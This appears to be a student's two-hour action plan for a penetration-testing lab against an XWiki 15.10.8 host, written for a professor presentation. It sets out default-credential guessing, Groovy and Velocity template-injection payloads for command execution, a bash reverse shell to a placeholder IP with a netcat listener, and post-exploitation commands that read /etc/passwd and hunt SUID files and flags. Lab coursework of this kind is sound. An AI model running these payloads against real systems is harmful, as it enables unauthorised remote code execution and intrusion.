# Next Steps - 2 Hour Action Plan
## For Professor Presentation

## ✅ What You've Completed So Far

1. **Reconnaissance Complete**
   - ✅ Port scan: Found XWiki 15.10.8 on port 8080
   - ✅ Version confirmed: 15.10.8 via REST API
   - ✅ Service identified: XWiki (Java-based wiki platform)

2. **Initial Authentication Attempts**
   - ✅ Tried default credentials (admin/admin, xwiki/xwiki, etc.)
   - ⚠️ Results: Need to check login responses

## 🎯 What To Do Next (Priority Order)

### STEP 1: Verify Login Results (5 minutes)

```bash
# Check if any login was successful
ls -la login_*.html
cat login_admin.html | head -50
cat login_xwiki.html | head -50

# Look for success indicators
grep -i "logout\|dashboard\|welcome\|main" login_*.html
```

**If login successful:** Proceed to Step 3 (Template Injection)
**If login failed:** Proceed to Step 2 (Find Credentials)

---

### STEP 2: Find Credentials (15-30 minutes)

#### Option A: Try More Default Credentials
```bash
# Try common combinations
curl -s -X POST http://10.129.7.80:8080/xwiki/bin/login/XWiki/XWikiLogin \
    -d "j_username=Admin&j_password=admin" \
    -L -c cookies.txt -o login_test.html

curl -s -X POST http://10.129.7.80:8080/xwiki/bin/login/XWiki/XWikiLogin \
    -d "j_username=admin&j_password=password" \
    -L -c cookies.txt -o login_test2.html

curl -s -X POST http://10.129.7.80:8080/xwiki/bin/login/XWiki/XWikiLogin \
    -d "j_username=admin&j_password=123456" \
    -L -c cookies.txt -o login_test3.html
```

#### Option B: Check if XWiki is Still Initializing
```bash
# Check initialization status
curl -s http://10.129.7.80:8080/xwiki/ | grep -i "initializing"
```

**If still initializing:** Wait or try accessing after initialization

#### Option C: Try Anonymous Access
```bash
# Check if anonymous users can create pages
curl -s http://10.129.7.80:8080/xwiki/bin/view/Main/WebHome
curl -s http://10.129.7.80:8080/xwiki/bin/edit/Main/TestPage
```

---

### STEP 3: Template Injection RCE (30-45 minutes) ⭐ **PRIMARY GOAL**

**If you have credentials OR anonymous access works:**

#### 3A. Set Up Reverse Shell Listener
```bash
# In a NEW terminal window
nc -lvp 4444
```

#### 3B. Get Your IP Address
```bash
ip addr show tun0
# or
ifconfig | grep inet
```

#### 3C. Access XWiki and Create Page with Template Injection

**Method 1: Via Web Interface**
1. Go to: http://10.129.7.80:8080/xwiki
2. Login (if credentials found) or use anonymous access
3. Create new page or edit existing
4. Add this content:

```groovy
{{groovy}}
def proc = 'whoami'.execute()
proc.waitFor()
println proc.text
{{/groovy}}
```

5. Save and view page - should show username

6. For reverse shell, replace with:
```groovy
{{groovy}}
def proc = 'bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'.execute()
proc.waitFor()
{{/groovy}}
```
(Replace YOUR_IP with your Kali IP from step 3B)

**Method 2: Via REST API (if authenticated)**
```bash
# First, get session cookie from successful login
# Then create page via API with template injection payload
```

#### 3D. Alternative: Velocity Template Injection
If Groovy doesn't work, try Velocity:
```
#set($exec = $xwiki.getClass().forName('java.lang.Runtime').getRuntime().exec('whoami'))
#set($is = $exec.getInputStream())
#foreach($i in [1..$is.available()])
$is.read()
#end
```

---

### STEP 4: Search for Known Exploits (10 minutes)

```bash
# Search for XWiki 15.10.8 exploits
searchsploit xwiki 15.10

# Search for XWiki 15.x exploits
searchsploit xwiki 15

# Check online for CVEs
# Visit: https://jira.xwiki.org/browse/XWIKI
# Visit: https://www.cvedetails.com/vulnerability-list/vendor_id-10077/Xwiki.html
```

---

### STEP 5: Post-Exploitation (If Shell Gained) (15 minutes)

```bash
# Once you have shell, run these:
whoami
id
uname -a
cat /etc/passwd
sudo -l
find / -perm -4000 2>/dev/null

# Find flags
cat /root/root.txt
cat /home/*/user.txt
find / -name "user.txt" 2>/dev/null
find / -name "root.txt" 2>/dev/null
```

---

## 📋 What To Tell Your Professor

### Current Status:
1. **Reconnaissance Complete**
   - Identified XWiki 15.10.8 running on port 8080
   - Confirmed version via REST API
   - Attempted initial authentication

2. **Next Steps:**
   - Verify authentication results
   - Attempt template injection for RCE (primary method)
   - Search for known CVEs if template injection fails
   - Document all findings

3. **Methodology:**
   - Following PTES framework
   - Using Jenkins CVE-2024-23897 methodology (file read → hash extraction → RCE)
   - Adapting to XWiki's template injection vectors

### If You Get Stuck:
- Document what you tried
- Show the professor the commands you ran
- Explain the methodology even if exploitation didn't work
- **Documentation is as important as exploitation for the assignment**

---

## 🚨 Quick Commands to Run NOW

```bash
# 1. Check login results
ls -la login_*.html 2>/dev/null
cat login_admin.html 2>/dev/null | head -30

# 2. Check if XWiki is ready
curl -s http://10.129.7.80:8080/xwiki/ | head -50

# 3. Try accessing main page
curl -s http://10.129.7.80:8080/xwiki/bin/view/Main/WebHome | head -50

# 4. Search for exploits
searchsploit xwiki 15.10
```

---

## 📝 Documentation Commands

```bash
# Save all outputs
mkdir -p ~/xwiki_exploitation_$(date +%Y%m%d_%H%M%S)
cd ~/xwiki_exploitation_*

# Document everything
echo "=== XWiki Exploitation Attempt ===" > documentation.txt
date >> documentation.txt
echo "" >> documentation.txt
echo "Version: 15.10.8" >> documentation.txt
echo "IP: 10.129.7.80" >> documentation.txt
echo "" >> documentation.txt

# Save all command outputs
curl -s http://10.129.7.80:8080/xwiki/rest/ >> documentation.txt
```

---

## ⏰ Time Breakdown (2 Hours)

- **0-15 min**: Verify login, try more credentials
- **15-60 min**: Template injection attempts (PRIMARY FOCUS)
- **60-90 min**: Search exploits, try alternative methods
- **90-120 min**: Document everything, prepare presentation

**PRIORITY: Get template injection working - that's your best bet!**

